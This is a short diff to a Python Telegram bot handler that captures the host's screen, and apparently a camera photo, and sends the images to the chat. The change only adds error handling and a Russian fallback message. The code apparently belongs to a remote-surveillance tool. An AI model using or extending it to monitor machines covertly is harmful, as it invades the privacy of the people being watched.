@@ -77,10 +77,12 @@ async def filr(msg:types.Message):
     cp.release()
 
     import pyautogui as pg
-    
-    sc = pg.screenshot()
-    sc.save(r'sc.png')
-    await msg.reply_document(open('sc.png', 'rb'))
+    try:
+        sc = pg.screenshot()
+        sc.save(r'sc.png')
+        await msg.reply_document(open('sc.png', 'rb'))
+    except:
+        await msg.answer('Экран блокнут рут правами')
     await msg.reply_document(open('photo.png', 'rb'))
 
 
